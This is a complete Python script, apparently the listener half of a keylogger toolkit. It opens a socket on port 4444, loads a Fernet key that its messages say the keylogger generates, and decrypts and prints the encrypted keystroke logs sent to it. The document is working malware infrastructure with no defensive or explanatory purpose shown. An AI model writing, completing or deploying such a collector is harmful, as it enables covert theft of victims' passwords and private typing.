
import socket
import os
from cryptography.fernet import Fernet
import base64


HOST = "127.0.0.1"  
PORT = 4444
KEY_FILE = "key.key"

cipher_suite = None

def load_key():
    global cipher_suite
    if not os.path.exists(KEY_FILE):
        print(f"[!] Encryption key file '{KEY_FILE}' not found. Cannot start server.")
        print("[!] Please run the keylogger first to generate the key and then copy it here.")
        exit(1)
    
    with open(KEY_FILE, "rb") as key_file:
        key = key_file.read()
    cipher_suite = Fernet(key)
    print("[*] Encryption key loaded successfully.")

def decrypt_data(encrypted_data):
    try:
        decoded_data = base64.b64decode(encrypted_data)
        decrypted_data = cipher_suite.decrypt(decoded_data)
        return decrypted_data.decode('utf-8')
    except Exception as e:
        return f"[!] DECRYPTION FAILED: {e}\nRaw Data: {encrypted_data}"

def main():
    load_key()

    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.bind((HOST, PORT))
        s.listen()
        print(f"[*] Server listening on {HOST}:{PORT}...")

        while True:
            try:
                conn, addr = s.accept()
                with conn:
                    print(f"\n[*] Connected by {addr}")
                    data = conn.recv(4096) # Receive up to 4KB
                    if not data:
                        continue
                    
                    print("-" * 50)
                    print(f"[*] Received Encrypted (and Base64) Data:")
                    print(data.decode('utf-8', errors='ignore'))
                    print("-" * 50)

                    decrypted_log = decrypt_data(data)
                    
                    print("[*] Decrypted Log Content:")
                    print(decrypted_log)
                    print("-" * 50)

            except KeyboardInterrupt:
                print("\n[*] Server is shutting down.")
                break
            except Exception as e:
                print(f"[!] An error occurred: {e}")

if __name__ == "__main__":
    main()
